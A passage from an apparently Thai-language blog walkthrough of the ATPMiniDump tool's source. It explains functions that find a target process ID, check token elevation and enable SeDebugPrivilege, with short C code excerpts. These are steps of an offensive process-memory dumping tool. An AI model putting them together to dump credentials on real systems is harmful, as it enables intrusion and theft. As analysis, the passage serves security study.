<li>พารามิเตอร์ <code>SystemInformationClass</code> ประเภท <code>SYSTEM_INFORMATION_CLASS</code> เป็นพารามิเตอร์สำหรับระบุประเภทของข้อมูลของระบบที่จะฟังก์ชันนี้ในการดึง โดยค่าของพารามิเตอร์จะต้องเป็นค่าใดค่าหนึ่งจากประเภทของข้อมูล <a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/class.htm"><code>SYSTEM_INFORMATION_CLASS</code></a></li>
<li>พารามิเตอร์ <code>SystemInformation</code> ประเภท <code>PVOID</code> เป็นพารามิเตอร์สำหรับระบุตัวแปรพอยน์เตอร์ซึ่งชี้ไปยังตำแหน่งของบัฟเฟอร์ที่ฟังก์ชันจะเก็บข้อมูผลลัพธ์เมื่อทำงานเสร็จสิ้น</li>
<li>พารามิเตอร์ <code>SystemInformationLength</code> ประเภท <code>ULONG</code> เป็นพารามิเตอร์สำหรับระบุขนาดของบัฟเฟอร์ที่พารามิเตอร์ <code>SystemInformation</code> ชี้ไปโดยมีหน่วยเป็นไบต์</li>
<li>พารามิเตอร์ <code>ReturnLength</code> ประเภท <code>PULONG</code> เป็นพารามิเตอร์สำหรับระบุตัวแปรพอยน์เตอร์ซึ่งชี้ไปยังตำแหน่งบัฟเฟอร์ที่ฟังก์ชันจะเก็บข้อมูลขนาดของผลลัพธ์การทำงานจริง พารามิเตอร์นี้จะถูกใช้เพื่อตรวจสอบว่าการกำหนดค่าในพารามิเตอร์ <code>SystemInformationLength</code> นั้นสอดคล้องกับค่าในพารามิเตอร์ <code>ReturnLength</code> หรือไม่ ในกรณีที่ค่าที่ระบุในพารามิเตอร์ <code>SystemInformationLength</code> ไม่เพียงพอ ฟังก์ชันจะมีการส่งค่ากลับไปฟังก์ชันซึ่งเรียกใช้ว่ามีการทำงานที่ผิดพลาด</li>
</ul>
<p>การเรียกใช้ฟังก์ชัน <code>ZwQuerySystemInformation()</code> มีการระบุอากิวเมนต์ที่น่าสนใจเข้าไปเพียงอากิวเมนต์เดียวคือที่ตำแหน่งพารามิเตอร์ <code>SystemInformationClass</code> ซึ่งถูกระบุค่าเป็น <code>SystemProcessInformation</code> ซึ่งประเภทของข้อมูลของระบบเมื่อถูกระบุหรือถูกเรียกหา ค่าที่เราจะได้รับจะมีลักษณะเป็นอาเรย์ซึ่งเก็บข้อมูลของโปรเซสเอาไว้</p>
<blockquote>
<p><strong>SystemProcessInformation</strong></p>
<p>An array of SYSTEM_PROCESS_INFORMATION structures, one for each process running in the system.</p>
<p>These structures contain information about the resource usage of each process, including the number of handles used by the process, the peak page-file usage, and the number of memory pages that the process has allocated.</p>
<p>— <em><a href="https://docs.microsoft.com/en-us/windows/win32/sysinfo/zwquerysysteminformation#parameters">ZwQuerySystemInformation function parameters</a></em></p>
</blockquote>
<p>ทั้งนี้ถ้าเราสังเกตดูให้ดีในการเรียกใช้ฟังก์ชัน <code>ZwQuerySystemInformation()</code> พารามิเตอร์ <code>SystemInformation</code> ซึ่งควรถูกระบุเพื่อจัดเก็บข้อมูลกลับไม่มีการระบุค่าใด ๆ เอาไว้เลย พารามิเตอร์ที่ดูเหมือนจะมีการรับข้อมูลมีเพียงพารามิเตอร์เดียวคือ <code>uReturnLength</code> ซึ่งรับค่าขนาดของผลลัพธ์ออกมาเก็บไว้ จากนั้นจึงมีการตรวจสอบด้วยค่าประเภท <code>NTSTATUS</code> เพื่อให้แน่ใจว่าฟังก์ชันทำงานไม่ล้มเหลว อย่างไรก็ตามเฉลยของการเรียกใช้ฟังก์ชัน <code>ZwQuerySystemInformation()</code> ก็อยู่ไม่ใกล้ไม่ไกลจากโค้ดส่วนปัจจุบัน ซึ่งก็คืออีกไม่กี่บรรทัดต่อจากนี้ครับ</p>
<p>หลังจากมีการเรียกใช้ <code>ZwQuerySystemInformation()</code> จนได้ค่าขนาดของผลลัพธ์ของประเภทข้อมูล <code>SystemProcessInformation</code> มาเก็บไว้ที่ <code>uReturnLength</code> แล้ว เราจะเห็นการใช้ค่าใน <code>uReturnLength</code> ในโค้ดด้านล่าง</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">LPVOID pBuffer <span style="color:#f92672">=</span> NULL;
SIZE_T uSize <span style="color:#f92672">=</span> uReturnLength;
status <span style="color:#f92672">=</span> NtAllocateVirtualMemory(
  GetCurrentProcess(), <span style="color:#75715e">// ProcessHandle
</span><span style="color:#75715e"></span>  <span style="color:#f92672">&amp;</span>pBuffer, <span style="color:#75715e">// *BaseAddress
</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0</span>, <span style="color:#75715e">// ZeroBits
</span><span style="color:#75715e"></span>  <span style="color:#f92672">&amp;</span>uSize, <span style="color:#75715e">// RegionSize
</span><span style="color:#75715e"></span>  MEM_COMMIT, <span style="color:#75715e">// AllocationType
</span><span style="color:#75715e"></span>  PAGE_READWRITE <span style="color:#75715e">// Protect
</span><span style="color:#75715e"></span>);
<span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
  <span style="color:#66d9ef">return</span> FALSE;
}

status <span style="color:#f92672">=</span> ZwQuerySystemInformation(
  SystemProcessInformation,  <span style="color:#75715e">// SystemInformationClass
</span><span style="color:#75715e"></span>  pBuffer, <span style="color:#75715e">// SystemInformation
</span><span style="color:#75715e"></span>  uReturnLength, <span style="color:#75715e">// SystemInformationLength
</span><span style="color:#75715e"></span>  <span style="color:#f92672">&amp;</span>uReturnLength <span style="color:#75715e">// ReturnLength
</span><span style="color:#75715e"></span>  );
	<span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
		<span style="color:#66d9ef">return</span> FALSE;
	}
</code></pre></div><p>ค่า <code>uReturnLength</code> ที่เก็บค่าขนาดของประเภทข้อมูล <code>SystemProcessInformation</code> ซึ่งเป็นผลลัพธ์ของการฟังก์ชัน <code>ZwQuerySystemInformation()</code> ทุกจัดเก็บไว้ในตัวแปรใหม่ประเภท <code>SIZE_T</code> ชื่อ <code>uSize</code> พร้อมๆ กับการสร้างตัวแปรใหม่ในประเภท <code>LPVOID</code> ชื่อ <code>pBuffer</code> ซึ่งถูกกำหนดค่าเป็น <code>NULL</code> ตัวแปรใหม่ทั้งสองนี้ถูกนำมาใช้เป็นพารามิเตอร์ของฟังก์ชัน <code>NtAllocateVirtualMemory()</code> ซึ่งปรากฎในลำดับต่อมา โดยฟังก์ชันถูกเตรียมพร้อมในลักษณะของ function pointer เอาไว้อยู่แล้วซึ่งทำให้เราสามารถใช้งานฟังก์ชันนี้ได้ทันที</p>
<p>ฟังก์ชัน <code>NtAllocateVirtualMemory()</code> เป็นฟังก์ชันสำหรับการจองและจัดการพื้นที่ในหน่วยความจำของโปรเซส โดยพารามิเตอร์ที่มีความสำคัญต่อกการทำงานของโปรแกรมมีดังต่อไปนี้</p>
<ul>
<li>พารามิเตอร์ <code>ProcessHandle</code> เป็นพารามิเตอร์ซึ่งมีไว้ให้เราระบุโปรเซสที่เราจะใช้ฟังก์ชัน <code>NtAllocateVirtualMemory()</code> เข้าไปจองหน่วยความจำ ในทีนี้เราจะเห็นการใช้ฟังก์ชัน <code>GetCurrentProcess()</code> เพื่อให้ได้มาซึ่ง process handle ของโปรเซสปัจจุบันซึ่งบ่งชี้ให้เห็นว่าการจองพื้นที่หน่วยความจำที่กำลังจะเกิดขึ้นนั้นอยู่ในขอบเขตของโปรเซสปัจจุบัน</li>
<li>พารามิเตอร์ <code>*BaseAddress</code> ซึ่งเป็นตัวแปรแบบพอยน์เตอร์ที่จะเก็บตำแหน่งของหน่วยความจำซึ่งเป็นผลลัพธ์จากการทำงานของฟังก์ชัน <code>NtAllocateVirtualMemory()</code> ในที่นี้โค้ดมีการระบุตำแหน่งของตัวแปร <code>pBuffer</code> ซึ่งถูกสร้างไว้ก่อนหน้า</li>
<li>พารามิเตอร์ <code>RegionSize</code> เป็นพารามิเตอร์ซึ่งใช้ในการระบุขนาดในหน่วยไบต์ของพื้นที่ในหน่วยความจำที่จะมีการจอง ในที่นี้เราจะเห็นการนำค่า <code>uSize</code> ซึ่งมีที่มาจากตัวแปร <code>uReturnLength</code> ของการเรียกฟังก์ชัน <code>ZwQuerySystemInformation()</code> มาใช้งาน</li>
</ul>
<p>พารามิเตอร์อื่นๆ ซึ่งถูกระบุในการเรียกใช้ฟังก์ชัน อาทิ <code>AllocationType</code>, <code>ZeroBits</code> และ <code>Protect</code> เป็นพารามิเตอร์เสริมซึ่งใช้เพื่อระบุคุณลักษณะอื่นๆ ของพื้นที่หน่วยความจำที่ทำการจอง ผลลัพธ์ของการเรียกใช้ฟังก์ชัน <code>NtAllocateVirtualMemory()</code> จะถูกตรวจสอบว่าฟังก์ชันทำงานเสร็จสิ้นหรือไม่ หากไม่เสร็จสิ้นฟังก์ชันจะถูกหยุดการทำงาน แต่หากฟังก์ชันนี้ทำงานเสร็จสิ้น เราก็จะได้พื้นที่ใหม่ในหน่วยความจำของโปรเซสปัจจุบันตามขนาดที่เราระบุ และสามารถเรียกใช้ได้ผ่านตำแหน่งของหน่วยความจำซึ่งถูกเก็บอยู่ในตัวแปร <code>pBuffer</code></p>
<p>ต่อมาฟังก์ชัน <code>ZwQuerySystemInformation()</code> จะถูกเรียกใช้เป็นครั้งที่สองด้วยจุดประสงค์ที่ต่างออกไป เนื่องจากในตอนนี้เรามีพื้นที่ว่างในหน่วยความจำพร้อมใช้งานแล้ว เราก็สามารถระบุพื้นที่ดังกล่าวให้กับฟังก์ชัน <code>ZwQuerySystemInformation()</code> เพื่อจัดเก็บข้อมูลต่อได้ สังเกตว่าธรรมชาติของภาษาซีนั้น ก่อนจะมีการดำเนินการเรียกหาข้อมูลใดๆ เราจำเป็นจะต้องจัดเตรียมพื้นที่เอาไว้จัดเก็บผลลัพธ์เสมอ ซึ่งนั่นคือสิ่งที่เราเห็นในการเรียกใช้ฟังก์ชัน <code>ZwQuerySystemInformation()</code> ครั้งแรกกับการเรัยกใช้ฟังก์ชัน <code>NtAllocationVirtualMemory()</code> ครับ</p>
<p>การเรียกใช้ฟังก์ชัน <code>ZwQuerySystemInformation()</code> ในครั้งที่สองจะสังเกตได้อย่างชัดเจนว่าตัวแปร <code>pBuffer</code> นั้นถูกใส่ไว้ในตำแหน่งของพารามิเตอร์ <code>SystemInformation</code> เพื่อเป็นตำแหน่งที่จะเก็บข้อมูลผลลัพธ์ของการทำงาน โดยเมื่อสิ้นสุดการทำงานแล้ว พื้นที่หน่วยความจำซึ่งถูกอ้างอิงด้วยตัวแปร <code>pBuffer</code> จะเก็บข้อมูลประเภท <code>SystemProcessInformation</code> หรืออธิบายอีกอย่างได้คือข้อมูลของรายละเอียดของโปรเซสที่กำลังทำงานอยู่ในระบบ (หากใครสนใจว่า <code>pBuffer</code> เก็บข้อมูลในลักษณะใด ก็สามาถดีบั๊กเพื่อดูค่าในตัวแปรนี้ได้ตามสะดวกครับ)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">_RtlEqualUnicodeString RtlEqualUnicodeString <span style="color:#f92672">=</span> (_RtlEqualUnicodeString) GetProcAddress(GetModuleHandle(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;RtlEqualUnicodeString&#34;</span>);
<span style="color:#66d9ef">if</span> (RtlEqualUnicodeString <span style="color:#f92672">==</span> NULL) {
  <span style="color:#66d9ef">return</span> FALSE;
}
</code></pre></div><p>โค้ดส่วนต่อมาคือการสร้าง function pointer ให้กับฟังก์ชันชื่อ <code>RtlEqualUnicodeString()</code> ด้วยรูปแบบที่เราคุ้นเคยกันดี ฟังก์ชัน <code>RtlEqualUnicodeString()</code> มีการทำงานตรงตัวตามชื่อของมันการรับค่าอินพุตเข้าไปสองค่าในประเภท <code>PCUNICODE_STRING</code> หรือสตริงซึ่งใช้ยูนิโค้ด จากนั้นทำการเปรียบเทียบว่าสตริงทั้งสองค่านั้นเป็นสตริงเดียวกันหรือไม่ หากเป็นสตริงเดียวกันฟังก์ชัน <code>RtlEqualUnicodeString()</code> จะส่งผลลัพธ์เป็น <code>TRUE</code> และเป็น <code>FALSE</code> หากไม่เป็นสตริงเดียวกัน</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">PSYSTEM_PROCESSES pProcInfo <span style="color:#f92672">=</span> (PSYSTEM_PROCESSES) pBuffer;
</code></pre></div><p>ในส่วนถัดมาเราจะเห็นโค้ดในลักษณะที่เหมือนกับการทำ function pointer แต่ในความคิดของผมนั้น มันจะสามารถเข้าใจได้ง่ายกว่าถ้าเราอธิบายโค้ดในบรรทัดด้านบนว่าเป็นการเอาค่าผลลัพธ์จากการทำงานของฟังก์ชัน <code>ZwQuerySystemInformation()</code> นั้นมาทำการแปลงให้อยู่ในประเภทข้อมูลที่ชื่อ <code>PSYSTEM_PROCESSES</code> และเก็บผลลัพธ์ที่ได้ไว้ในตัวแปรชื่อ <code>pProcInfo</code> การทำแบบนี้มีจุดประสงค์เพื่อให้เราสามารถเข้าถึงค่าใน <code>pBuffer</code> ได้อย่างเป็นรูปแบบตามโครงสร้างที่ประเภทข้อมูลนี้พึงมี เราสามารถดูรายละเอียดเพิ่มเติมของ <code>PSYSTEM_PROCESSES</code> ได้จาก<a href="https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.h#L87">ไฟล์ <code>ATPMiniDump.h</code> ที่บรรทัดที่ 87 ครับ</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_SYSTEM_PROCESSES</span> {
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	ULONG Reserved1[<span style="color:#ae81ff">6</span>];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	HANDLE ProcessId;
	HANDLE InheritedFromProcessId;
} SYSTEM_PROCESSES, <span style="color:#f92672">*</span>PSYSTEM_PROCESSES;
</code></pre></div><p>เมื่อผ่านการแปลงประเภทแล้ว เราสามารถมโนต่อได้เลยว่าหากเราเรียกดูข้อมูลโดยใช้การอ้างเป็น <code>&amp;pProcInfo.ProcessName</code> เราก็จะได้รายการของชื่อโปรเซสจากผลลัพ์ของ <code>SystemProcessInformation</code> นั่นเอง</p>
<p>ในตอนนี้เรามีรายการข้อมูลของโปรเซสที่ทำงานอยู่ในระบบอยู่แล้ว ด้วยจุดประสงค์ของฟังก์ชัน <code>GetPID()</code> คือการหาค่า process ID และค่านำเข้าของฟังก์ชันซึ่งคือ <code>pWinVerInfo.ProcName</code> เราน่าจะพอเดาสิ่งที่จะเกิดขึ้นต่อไปได้แล้วว่าสิ่งที่จะเกิดขึ้นต่อไปในการทำงานของฟังก์ชันนี้นั้นคือการนำข้อมูลใน <code>pProcInfo</code> ซึ่งเก็บรายการโปรเซสที่ทำงานอยู่ทั้งหมดในระบบมาเปรียบเทียบชื่อกับข้อมูลในตัวแปร <code>pWinVerInfo.ProcName</code> ด้วยฟังก์ชัน <code>RtlEqualUnicodeString()</code> ซึ่งถูกสร้างขึ้นมาแต่ยังไม่ถูกเรียกใช้ เมื่อมีเปรียบเทียบชื่อจนเจอแล้ว เราก็สามารถคาดเดาได้ว่าค่า <code>pProcInfo.ProcessId</code> ของโปรเซสที่มีชื่อตรงกับที่เราต้องการจะถูกย้ายมาเก็บไว้ใน <code>pWinVerInfo.hTargetPID</code> ที่มีการ initialize ค่าเป็น <code>NULL</code> เอาไว้ตั้งแต่เริ่มต้นฟังก์ชัน</p>
<p>โค้ดส่วนถัดไปอธิบายสิ่งที่เราคาดเดาไว้ด้านบนครับ</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">do</span> {
		<span style="color:#66d9ef">if</span> (RtlEqualUnicodeString(<span style="color:#f92672">&amp;</span>pProcInfo<span style="color:#f92672">-&gt;</span>ProcessName, <span style="color:#f92672">&amp;</span>pWinVerInfo<span style="color:#f92672">-&gt;</span>ProcName, TRUE)) {
			pWinVerInfo<span style="color:#f92672">-&gt;</span>hTargetPID <span style="color:#f92672">=</span> pProcInfo<span style="color:#f92672">-&gt;</span>ProcessId;
			<span style="color:#66d9ef">break</span>;
		}
		
		pProcInfo <span style="color:#f92672">=</span> (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) <span style="color:#f92672">+</span> pProcInfo<span style="color:#f92672">-&gt;</span>NextEntryDelta);
} <span style="color:#66d9ef">while</span> (pProcInfo);
</code></pre></div><p>มีการเรียกใช้ <code>do-while</code> ในการไล่หาข้อมูลใน <code>pProcInfo</code> และเราจะเห็นการขยับค่าใน <code>pProcInfo</code> ด้วยการเอาตำแหน่งข้อมูลปัจจุบันมารวมระยะห่างของข้อมูลในรายการโปรเซสซึ่งถัดไปด้วย <code>pProcInfo.NextEntryDelta</code> ด้วย ในกรณีที่มีโปรเซสซึ่งมีชื่อตรงกับที่เราต้องการ ค่า process ID ก็จะถูกนำไปเก็บไว้ <code>pWinVerInfo.hTargetPID</code> แต่กรณีที่ไม่พบแล้วนั้น ค่าใน <code>pWinVerInfo.hTargetPID</code> ก็จะยังคงเป็นค่า <code>NULL</code> ตามที่ iniitalize ไว้ในตอนแรกเหมือนเดิม</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">status <span style="color:#f92672">=</span> NtFreeVirtualMemory(GetCurrentProcess(), <span style="color:#f92672">&amp;</span>pBuffer, <span style="color:#f92672">&amp;</span>uSize, MEM_RELEASE);

<span style="color:#66d9ef">if</span> (pWinVerInfo<span style="color:#f92672">-&gt;</span>hTargetPID <span style="color:#f92672">==</span> NULL) {
  <span style="color:#66d9ef">return</span> FALSE;
}

<span style="color:#66d9ef">return</span> TRUE;
</code></pre></div><p>ส่วนสุดท้ายของฟังก์ชัน <code>GetPID()</code> คือการเรียกใช้ฟังก์ชัน <code>NtFreeVirtualMemory()</code> เพื่อจัดการคืนพื้นที่ของหน่วยความจำซึ่งถูกจองไว้ด้วยฟังก์ชัน <code>NtAllocateVirtualMemory()</code> หลังจากนั้นฟังก์ชันจะมีการตรวจสอบค่าผลลัพธ์ว่า <code>pWinVerInfo.hTargetPID</code> ยังมีค่าเป็น <code>NULL</code> อยู่หรือไม่ หากใช่ก็จะมีการส่งค่า <code>FALSE</code> ออก แต่หากไม่ก็จะมีการส่งหา <code>TRUE</code> ออก เป็นอันจับการทำงานของฟังก์ชัน <code>GetPID()</code> ครับ</p>
<h3 id="iselevated-function">IsElevated Function</h3>
<blockquote>
<p>ดูโค้ดของฟังก์ชัน <code>IsElevated()</code> แบบเต็มได้<a href="https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L80">ที่นี่</a></p>
</blockquote>
<p>ฟังก์ชัน <code>IsEleveated()</code> เป็นฟังก์ชันที่จะส่งออกข้อมูลประเภท <code>BOOL</code> ไม่มีการรับอากิวเมนต์ใดๆ เข้ามาประมวลผลในฟังก์ชัน และจะส่งออกค่าออกเป็น <code>TRUE</code> หรือ <code>FALSE</code> เท่านั้น</p>
<p>จุดประสงค์ของฟังก์ชัน <code>IsElevated()</code> คือการตรวจสอบ access token ของโปรเซสปัจจุบันว่าได้มีการกำหนดประเภทของค่าใน access token ว่ามีการตั้งค่าที่ถูกต้องแล้วหรือไม่ โดยค่าใน access token ที่ฟังก์ชันนี้จะทำการตรวจสอบคือค่าใน struct ชื่อ <code>TOKEN_ELEVATION</code> ซึ่งค่าใน access token ที่ระบุสิทธิ์ของผู้ดูแลระบบ</p>
<p>ฟังก์ชันทำการตรวจสอบ access token ปัจจุบันที่โปรเซส <code>ATPMiniDump.exe</code> มีอยู่ผ่านฟังก์ชัน <code>OpenAccessToken()</code> โดยฟังก์ชัน <code>OpenAccessToken()</code> มีการรับค่า process handle ซึ่งเป็นเป้าหมายของการตรวจสอบ สิทธิ์และรูปแบบในการเข้าถึง access token ของโปรเซสดังกล่าวและพอยน์เตอร์ซึ่งชี้ไปยังตัวแปรที่จะใช้เพื่อจัดเก็บตำแหน่งของ access token handle โดยในกรณีนี้เราจะสามารถสังเกตได้ว่าฟังก์ชันมีการใช้ process handle ที่เป็นผลลัพธ์จากการเรียกใช้ฟังก์ชัน <code>GetCurrentProcess()</code> ซึ่งจะได้ผลลัพธ์เป็น process handle ของโปรเซสปัจจุบัน</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>OpenProcessToken(
        GetCurrentProcess(), <span style="color:#75715e">// ProcessHandle
</span><span style="color:#75715e"></span>        TOKEN_QUERY <span style="color:#f92672">|</span> TOKEN_ADJUST_PRIVILEGES, <span style="color:#75715e">// DesiredAccess
</span><span style="color:#75715e"></span>        <span style="color:#f92672">&amp;</span>hToken <span style="color:#75715e">// TokenHandle
</span><span style="color:#75715e"></span>        )
    ) {
    TOKEN_ELEVATION Elevation <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
    DWORD cbSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(TOKEN_ELEVATION);
}
</code></pre></div><p>ในกรณีที่ฟังก์ชัน <code>OpenProcessToken()</code> ทำงานเสร็จสิ้นและไม่เกิดข้อผิดพลาด ฟังก์ชันจะมีการสร้างตัวแปร <code>Elevation</code> จาก struct <code>TOKEN_ELEVATION</code> และมีการสร้างตัวแปร <code>cbSize</code> โดยมีการกำหนดค่าให้จัดเก็บขนาดของ struct <code>TOKEN_ELEVATION</code> เอาไว้ในรูปแบบ DWORD</p>
<p>หากสงสัยว่าตัวแปรสองตัวนี้ถูกสร้างขึ้นมาเพราะอะไร โค้ดด้านล่างคือคำตอบครับ</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">if</span> (GetTokenInformation(
      hToken, <span style="color:#75715e">// TokenHandle
</span><span style="color:#75715e"></span>      TokenElevation, <span style="color:#75715e">// TokenInformationClass
</span><span style="color:#75715e"></span>      <span style="color:#f92672">&amp;</span>Elevation, <span style="color:#75715e">// TokenInformation
</span><span style="color:#75715e"></span>      <span style="color:#66d9ef">sizeof</span>(Elevation), <span style="color:#75715e">// TokenInformationLength
</span><span style="color:#75715e"></span>      <span style="color:#f92672">&amp;</span>cbSize <span style="color:#75715e">// ReturnLength
</span><span style="color:#75715e"></span>      ) 
    ) {
  fRet <span style="color:#f92672">=</span> Elevation.TokenIsElevated;
}
</code></pre></div><p>ฟังก์ชัน <code>GetTokenInformation()</code> คือฟังก์ชันถัดมาซึ่งถูกเรียกใช้ หน้าที่ของฟังก์ชันนี้คือการเรียกหาข้อมูลแบบระบุประเภทซึ่งอยู่ใน access token โดยเราสามารอธิบายการทำงานของฟังก์ชัน <code>GetTokenInformation()</code> ด้วยพารามิเตอร์ที่ถูกระบุมาไว้ก่อนแล้วได้ดังนี้</p>
<p>ให้ดึงข้อมูลจาก access token โดยที่</p>
<ul>
<li>ถ้าดึงมาได้แล้วให้เก็บตำแหน่งของ access token ไปที่ access token handler ชื่อ <code>hToken</code></li>
<li>ประเภทของข้อมูลที่เราจะดึงจาก access token คือประเภท <code>TOKEN_ELEVATION</code></li>
<li>ถ้าดึงมาได้แล้วให้ข้อมูลที่ดึงมาเก็บไว้ที่ตำแหน่งที่ของตัวแปร <code>Elevation</code></li>
<li>ขนาดของตัวแปรสำหรับเก็บข้อมูลซึ่งในที่นี้คือตัวแปร <code>Elevation</code> มีขนาดคือ <code>sizeof(Elevation)</code></li>
<li>ค่าที่ดึงมาจะต้องมีขนาดไม่เกิน <code>&amp;cbSize</code> ซึ่งก็คือลิมิตขนาดของข้อมูลประเภท <code>TOKEN_ELEVATION</code></li>
</ul>
<p>หากอ่านตามความสำคัญของพารามิเตอร์ด้านบน เราจะพบว่าหากฟังก์ชันทำงานสำเร็จ เราสามารถดูข้อมูลหรือผลลัพธ์ที่แท้จริงได้จากตัวแปร <code>Elevation</code> ที่ถูกกำหนด struct เอาไว้แล้วให้สอดคล้องกับข้อมูลประเภท <code>TOKEN_ELEVATION</code></p>
<p>อ้างอิงจาก <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_elevation">TOKEN_ELEVATION structure</a> ในกรณีที่โปรเซสมีสิทธิ์ของผู้ดูแลระบบอยู่แล้ว ค่าภายใน struct <code>TOKEN_ELEVATION</code> ที่มีชื่อว่า <code>TokenIsElevated</code> จะต้องไม่เป็นศูนย์ ฟังก์ชัน <code>IsElevated()</code> จะใช้วิธีการส่งค่าภายใน <code>Elevation.TokenIsElevated</code> ออกไปเป็นผลลัพธ์ ทั้งนี้ในกรณีที่การทำงานของฟังก์ชันหลุดออกจากเงื่อนทั้ง <code>OpenProcessToken()</code> หรือ <code>GetTokenInformation()</code> ฟังก์ชัน <code>TokenIsElevated()</code> จะส่งค่าออกมาเป็น <code>FALSE</code> หรือ <code>0</code> ทันที</p>
<h3 id="setdebugprivilege-function">SetDebugPrivilege Function</h3>
<blockquote>
<p>ดูโค้ดของฟังก์ชัน <code>SetDebugPrivilege()</code> แบบเต็มได้<a href="https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L96">ที่นี่</a></p>
</blockquote>
<p>ฟังก์ชัน <code>SetDebugPrivilege()</code> เป็นฟังก์ชันที่จะส่งออกข้อมูลประเภท <code>BOOL</code> ไม่มีการรับอากิวเมนต์ใดๆ เข้ามาประมวลผลในฟังก์ชัน และจะส่งออกค่าเป็น <code>TRUE</code> หรือ <code>FALSE</code> เท่านั้น</p>
<p>จุดประสงค์ของฟังก์ชัน <code>SetDebugPrivilege()</code> คือการกำหนดสิทธิ์ของโปรเซส <code>ATPMiniDump.exe</code> ให้มีสิทธิ์ <code>SeDebugPrivilege</code> ซึ่งเป็นสิทธิ์ของระบบปฏิบัติการที่ทำให้สามารถตรวจสอบและเปลี่ยนแปลงการทำงานของข้อมูลในหน่วยความจำของโปรเซสใดๆ ซึ่งมีบัญชีผู้ใช้งานอื่นเป็นเจ้าของ รวมไปถึงดำเนินการด้วยสิทธิ์ของระบบบางอย่างได้ กระบวนการกำหนดสิทธิ์จะทำโดยการแก้ไขค่าเกี่ยวกับสิทธิ์ที่โปรเซส <code>ATPMiniDump.exe</code> มีอยู่เพื่อให้ได้สิทธิ์ตามต้องการ โดยค่าดังกล่าวในสภาพแวดล้อมของระบบปฏิบัติการ Windows นั้นจะมีชื่อเรียกว่า access token</p>
<p>ค่า access token เป็นค่าซึ่งได้มาเมื่อผู้ใช้งานเข้าสู่ระบบโดยจะถูกถือครองโดยผู้ใช้งานและโปรเซสที่ถูกสร้างโดยผู้ใช้งาน ค่าที่อยู่ใน access token จะกำหนดสิทธิ์ที่ผู้ใช้งานและโปรเซสของผู้ใช้งานสามารถดำเนินการภายในระบบ ระบบจะทำการตรวจสอบ access token ดังกล่าวว่ามีสิทธิ์เพียงพอที่จะดำเนินการในเรื่องอย่างใดอย่างหนึ่งหรือไม่</p>
<p>ฟังก์ชันทำการตรวจสอบ access token ปัจจุบันที่โปรเซส <code>ATPMiniDump.exe</code> มีอยู่ผ่านฟังก์ชัน <code>OpenAccessToken()</code> เช่นเดียวกับที่ปรากฎในฟังก์ชัน <code>IsElevated()</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>OpenProcessToken(
        GetCurrentProcess(), <span style="color:#75715e">// ProcessHandle
</span><span style="color:#75715e"></span>        TOKEN_QUERY <span style="color:#f92672">|</span> TOKEN_ADJUST_PRIVILEGES, <span style="color:#75715e">// DesiredAccess
</span><span style="color:#75715e"></span>        <span style="color:#f92672">&amp;</span>hToken <span style="color:#75715e">// TokenHandle
</span><span style="color:#75715e"></span>        )
    ) {
    <span style="color:#66d9ef">return</span> FALSE;
}
</code></pre></div><p>ค่าใน access token ประกอบไปด้วยข้อมูลหลายส่วนรวมไปถึงส่วนซึ่งจะใช้ในการระบุสิทธิ์คือค่า struct ที่มีชื่อว่า <code>SEP_TOKEN_PRIVILEGES</code> กระบวนการในลำดับต่อไปคือการสร้างตัวแปร <code>TokenPrivileges</code> จาก struct <code>TOKEN_PRIVILEGES</code> และจะมีการกำหนดค่าซึ่งจะส่งผลให้โปรเซสที่มี access token ปัจจุบันนั้นมีสิทธิ์ <code>SeDebugPrivilege</code> การกำหนดค่าให้กับสมาชิกในตัวแปร <code>TokenPrivileges</code> มีตามลักษณะของ struct ดังนี้</p>
<ul>
